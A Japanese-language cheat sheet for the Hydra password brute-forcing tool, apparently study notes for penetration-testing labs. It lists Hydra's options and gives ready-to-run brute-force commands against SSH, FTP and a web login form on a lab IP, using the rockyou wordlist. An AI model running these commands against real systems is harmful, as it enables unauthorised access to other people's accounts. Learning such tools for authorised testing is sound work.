# 解説

ネットワークログインクラッカー。50種以上のプロトコルについて、ブルートフォースを実行する。

# 基本構文
```
hydra [ユーザーオプション] [パスワードオプション] [ターゲットIP] [プロトコル] [プロトコル専用オプション]
```

# 主要なオプション

### ユーザー・パスワード指定

```-l <user>``` 特定の**ユーザー名一つ**を指定
```-L <file>``` ユーザー名リストを指定
```-p <pass>``` 特定の**パスワード一つ**を指定
```-P <file>``` パスワードリストを指定

### 動作・出力制御

```-s <port>``` デフォルト以外のポートを指定
```-t <tasks>``` 並列実行数を指定。デフォルトは16
```-vV``` 詳細な試行状況を表示
```-f``` パスワードが見つかったら即座に終了
```-o <file>``` 見つかったパスワードを指定ファイルに保存

# コマンド例

### SSH突破
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh
```
### FTP突破
```
hydra -L user_list.txt -P rockyou.txt 10.10.10.10 ftp
```
### <重要>Webログインフォームへの攻撃
```
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=login failed"
```
※user, passなどのキーは開発者モードなどで確認すること。
